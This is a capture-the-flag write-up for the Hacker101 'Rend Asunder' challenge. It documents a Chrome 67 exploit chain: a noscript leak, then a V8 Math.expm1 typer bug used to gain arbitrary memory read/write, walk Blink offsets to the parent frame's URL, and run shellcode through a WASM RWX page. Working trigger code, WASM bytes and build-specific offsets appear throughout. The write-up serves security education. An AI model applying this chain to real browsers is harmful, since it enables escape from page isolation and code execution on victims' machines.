# Rend Asunder

**Platform:** HackerOne CTF (Hacker101)  
**Challenge:** Rend Asunder  
**Difficulty:** Expert  
**Category:** Native / Browser Exploitation  
**Flags:** 3 (Flag0–Flag2)

---

## Overview

Rend Asunder is a **native browser** challenge: the server runs your JavaScript inside **HeadlessChrome 67** (V8 6.7) and returns only an **800×800 screenshot** at `/image`. That screenshot is the entire I/O channel — a blind oracle.

```
you ──POST /saveScript──▶ server ──renders──▶ HeadlessChrome 67 ──▶ /image (PNG)
```

There is no `require`, no Node bindings, no PhantomJS `fs` module. The “sandbox” is a real Chromium renderer. Flag0 is a classic same-origin disclosure; Flag1 and Flag2 require a full **V8 type-confusion → arbitrary R/W → (read parent / RCE)** chain against Chrome 67.

**Hints provided:**

| Flag | Hints |
|------|--------|
| Flag0 | What do you have access to? / Look around your sandbox / Some places are Definitely mOre iMportant than others |
| Flag1 | The rendered page looks a bit odd / Can you look outside your iframe? / There might be something in the body or URL of the parent page |
| Flag2 | You need RCE here. No other way to put it! |

**Fingerprint (from `navigator.userAgent` + feature probes):**

- `HeadlessChrome/67.0.3396.x`
- `typeof BigInt === "function"` (Chrome ≥ 67)
- `Array.prototype.flat === undefined` (Chrome &lt; 69)

---

## Reconnaissance

### Application surface

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/` | GET | Form with `<textarea name="script">` and “Save” |
| `/saveScript` | POST | Stores script, redirects to `/` |
| `/image` | GET | PNG screenshot of the rendered page (800×800) |

No cookies. Script storage is per instance. The default script is:

```js
document.write('Hello from JS');
```

### Execution context

Submitting JS and dumping runtime facts shows:

| Probe | Result |
|-------|--------|
| `location.href` | `http://localhost/<32-hex-token>` |
| `window === top` | `false` (we are framed) |
| `location.ancestorOrigins[0]` | `"null"` (parent has **opaque** origin — typically a `data:` URL) |
| `parent.location` / `parent.document` | `SecurityError` (SOP) |
| `require` / `process` / `Buffer` | `undefined` |

Own page HTML (via sync XHR to `location.href`):

```html
<noscript>^FLAG^…$FLAG$</noscript>
<script>/* your submitted script */</script>
```

### Blind I/O constraint

OCR on the screenshot **mangles hex** (`5`↔`s`, `1`↔`l`, drops thin characters). For 64-character flags, text OCR is unreliable. Reliable exfil paints bits as a **16×16 black/white grid** with RGB corner markers (see `pil_decode.py`).

---

## Flag 0 — Hidden in `<noscript>`

**Method:** Same-origin fetch of own document; read the invisible tag  
**Hint mapping:** “Definitely mOre iMportant” → **DOM** (`<noscript>`)

### The vulnerability

`<noscript>` content is only *displayed* when JavaScript is disabled. With JS on (as in the headless renderer), the tag is invisible on the screenshot — but the bytes are still in **your own same-origin HTML**.

### Exploit

```js
var x = new XMLHttpRequest();
x.open("GET", location.href, false);
x.send();
var m = x.responseText.match(/\^FLAG\^([0-9a-fA-F]{64})\$FLAG\$/);
// paint m[1] as pixel grid (or document.write for OCR)
```

Equivalent one-liner for OCR:

```js
document.write(document.getElementsByTagName("noscript")[0].innerHTML);
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** “Not rendered” ≠ “not present.” Always dump raw source of the page you control.

---

## Flag 1 — Parent frame URL via V8 memory corruption

**Method:** `Math.expm1(-0)` typer bug → OOB → arbitrary read → Blink parent `Document.url_`  
**Hint mapping:** Look outside the iframe / parent body or URL

### The wall (SOP)

Flag1 lives in the **parent** frame (URL / body). From the child:

- Parent origin is opaque (`ancestorOrigins[0] === "null"`)
- Any access to `parent.location` / `parent.document` throws `SecurityError`

There is no legitimate web API that returns the parent’s content. SOP is enforced in software, however — not by hardware. Parent and child share one **renderer process**, so the parent’s URL string sits in the same address space.

### The bug: `Math.expm1` and minus zero

In IEEE-754, `Math.expm1(-0)` correctly returns `-0`. In Chrome 67’s V8, the TurboFan **typer** claimed `Math.expm1` never produces `-0` (only `PlainNumber ∪ NaN`).

```cpp
// src/compiler/typer.cc  (V8 6.7 / Chrome 67)
case kMathExpm1:
  return Type::Union(Type::PlainNumber(), Type::NaN(), t->zone());
// PlainNumber deliberately EXCLUDES -0
```

When optimized code then evaluates `Object.is(Math.expm1(x), -0)` and uses that boolean as an array index scale factor, the optimizer removes bounds checks (it believes the index is always 0). At runtime `x = -0` makes the check true → **out-of-bounds access**.

Warm-up uses the **string** `"0"` so the call site deopts/feedback still allows later optimization, then fire with real `-0`:

```js
function foo(x) {
  var a = [0.1, 0.2, 0.3, 0.4];
  var tb = [1.1, 2.2, 3.3];
  var o2 = { mz: -0 };
  var b = Object.is(Math.expm1(x), o2.mz);
  a[b * 12] = u2d(0, 0x434343); // OOB write: corrupt tb.length
  ob = tb;                       // tb now has a huge length
  return a[b * 100];
}
foo(0);
for (var i = 0; i < 100000; i++) foo("0"); // JIT
foo(-0); // trigger
```

### From OOB to arbitrary read/write

Canonical recipe:

1. Corrupt an adjacent double array’s length → heap-wide OOB float view (`ob`).
2. Place an object array next to it; write-verify a slot → **`addrOf(obj)`**.
3. Place an `ArrayBuffer`; locate `byte_length` / **backing store** through `ob` → overwrite the backing-store pointer → **arbitrary r/w** via `DataView` / `Float64Array`.

GC discipline matters: avoid allocations on the hot path between finding slots and using them (scavenge moves objects and invalidates indices).

### Walking Blink to the parent URL

`document` in JS is a V8 wrapper around a C++ Blink object. On **Chrome 67.0.3396.79** (build-specific offsets):

| Hop | Offset | Meaning |
|-----|--------|---------|
| wrapper → C++ object | `+0x20` | internal field 1 (field 0 is `WrapperTypeInfo`) |
| child `Document` → intermediate | `+0x240` | frame-tree hop |
| intermediate → parent `Document` | `+0x1c0` | parent document |
| parent `Document` → `url_` | `+0x2b0` | `StringImpl*` |
| `StringImpl` length | `+0x4` | `uint32` |
| `StringImpl` chars | `+0xC` | Latin-1 inline |

```js
var wr = addrOf(document);
// untag, then:
// R(wrapper, +0x20) → child Document*
// R(doc, +0x240) → X
// R(X, +0x1c0) → parent Document*
// R(parent, +0x2b0) → StringImpl*
// readSI(...) → parent URL string
```

The parent is a `data:text/html,...` document whose URL (after `decodeURIComponent`) contains:

```text
^FLAG^<64 hex>$FLAG$
```

Blink objects live on a **non-moving** heap, so these fixed offsets are stable across runs of the same build.

### Pixel-grid exfiltration

64 hex chars → 256 bits → 16×16 cells (black = 1, white = 0) plus red / green / blue corner markers for alignment. Decode offline with PIL (`pil_decode.py`) by sampling cell centers — no OCR ambiguity.

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** SOP is a software check. With a process-wide arbitrary read, “cross-origin” is just another pointer chase. Prefer fixed offsets into **non-moving** memory (Blink, `malloc`) over V8’s moving heap.

---

## Flag 2 — RCE and reading `flag2` from disk

**Method:** Same arb r/w → leak WASM RWX page → shellcode → `open`/`read`  
**Hint:** Explicit RCE requirement

### Why WASM?

Chrome 67’s JS JIT code pages were already W^X, but **WebAssembly** still compiled into **RWX** pages. Plan:

1. Create a minimal WASM module exporting `f() → 42`.
2. Include an **indirect function table** so `WasmInstanceObject` populates an immovable field.
3. Leak RWX page base, overwrite with shellcode, call `f()`.

### Stable RWX leak (V8 6.7)

Hard-coded multi-hop pointer chains and saelo’s later `instance+0xe0` layout **do not** match V8 6.7 (`WasmInstanceObject` is only ~`0xb0` bytes).

From V8 6.7 source: with a populated indirect function table,

```text
RWX_page_base = read64( read64(addrOf(instance) + 0xa0) + 0 )
```

`instance+0xa0` → `malloc`’d array of code entrypoints (untagged, non-moving); entry `[0]` is the RWX page. Sanity-check the page starts with the compiled prologue of `f` (`mov eax, 42; ret` → `b8 2a 00 00 00 c3`).

```js
var wc = new Uint8Array([
  0,97,115,109, 1,0,0,0,
  1,5,1,96,0,1,127,     // () -> i32
  3,2,1,0,
  4,4,1,112,0,1,         // table funcref min 1  ← critical
  7,5,1,1,102,0,0,       // export "f"
  9,7,1,0,65,0,11,1,0,   // elem[0] = func 0
  10,6,1,4,0,65,42,11    // i32.const 42; end
]);
var winst = new WebAssembly.Instance(new WebAssembly.Module(wc), {});
var wf = winst.exports.f;
```

### Shellcode and sandbox

Prove code exec first:

```asm
mov eax, 0x1337
ret
; B8 37 13 00 00 C3
```

If `wf() === 0x1337`, the RWX overwrite works.

File read (Linux x86-64, caller-saved regs only — do not clobber `rbx`/`rbp`/`r12–r15` or V8 crashes on return):

```text
sys_open(path="flag2", O_RDONLY)
sys_read(fd, buf, 0x2000)
store nbytes; ret
```

On the live instance, `open` succeeds (typical headless launch with `--no-sandbox` in Docker). Directory listing via `getdents64` shows a file literally named **`flag2`** next to `main.py` / `prestart.sh`.

Read 76 bytes: `^FLAG^` + 64 hex + `$FLAG$`. Exfil with the same pixel grid.

> **Flag 2:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Reliability on a blind target = fixed offsets into memory that **does not move**. Flag1 used Blink; Flag2 used a `malloc`’d WASM table. Approaches that crawl V8’s moving heap work “on my machine” and fail on the busy live GC.

---

## End-to-end chain

```
              Math.expm1(-0) typer lie  (V8 6.7 / Chrome 67)
                           │
                bounds check removed → OOB float array
                           │
            addrOf + arbitrary read/write  (GC-safe hot path)
               ┌───────────┴─────────────────────────┐
         FLAG1 (read)                           FLAG2 (execute)
               │                                      │
  wrapper+0x20 → Document               WASM instance + table
  → +0x240 → +0x1c0 → PARENT Doc       instance+0xa0 → [0] = RWX
  → +0x2b0 → url_ StringImpl            write shellcode → wf()
               │                        sandbox OFF → open/read flag2
               └──────── pixel grid canvas ──────────┘
                           │
                    /image → pil_decode.py → hex
```

---

## Complete Flag List

| Flag | Method | Value |
|------|--------|-------|
| Flag0 | Own-page `<noscript>` via XHR | `^FLAG^<redacted>$FLAG$` |
| Flag1 | V8 OOB arb-read → parent `data:` URL | `^FLAG^<redacted>$FLAG$` |
| Flag2 | WASM RWX shellcode → `flag2` file | `^FLAG^<redacted>$FLAG$` |

---

## Files in this writeup

| File | Purpose |
|------|---------|
| `submit.py` | POST script to instance, download `/image` |
| `pil_decode.py` | Decode 16×16 RGB-marked bit grid from screenshot |
| `flag0.js` | Flag0 extractor (pixel exfil) |
| `flag1.js` | Flag1 exploit (parent URL via arb read) |
| `flag2.js` | Flag2 exploit (RCE + read `flag2`) |

Usage:

```bash
python3 submit.py "https://<instance>.ctf.hacker101.com" flag0.js out.png 2
python3 pil_decode.py out.png
```

---

## References

- abiondo — *Exploiting the Math.expm1 typing bug in V8*  
  https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/
- Jay Bosamiya — *Krautflare (35C3 CTF 2018)*  
  https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
- vngkv123 / aSiagaming — Chrome V8 Math.expm1 notes  
  https://github.com/vngkv123/aSiagaming
- Samuel Groß / saelo — *Attacking Client-Side JIT Compilers* (Black Hat US 2018)

---

## Disclaimer

This targets **Chrome 67 (mid-2018)** in an **authorized CTF** environment. The typer bug, RWX WASM pages, and related primitives are long fixed on modern Chromium (heap sandbox, W^X WASM, etc.). Offsets and techniques here are educational only — do not use against systems you do not own or lack permission to test.
